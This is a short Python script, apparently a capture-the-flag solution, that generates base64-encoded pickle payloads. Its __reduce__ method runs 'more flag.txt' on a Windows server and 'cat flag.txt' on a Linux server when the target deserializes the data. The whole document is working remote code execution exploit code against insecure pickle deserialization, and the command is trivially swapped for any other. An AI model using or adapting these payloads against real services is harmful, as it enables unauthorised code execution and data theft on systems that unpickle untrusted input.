# For windows
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('more flag.txt',))

malicious_payload = base64.b64encode(pickle.dumps(RCE())).decode()
print("Payload for Windows server: ",malicious_payload)

# # for Linux
import pickle
import base64
import os
import subprocess

class RCE:
    def __reduce__(self):
        cmd = ('cat','flag.txt')
        return (subprocess.check_output, (cmd,))

malicious_payload = base64.b64encode(pickle.dumps(RCE())).decode()
print("Payload for linux server: ",malicious_payload)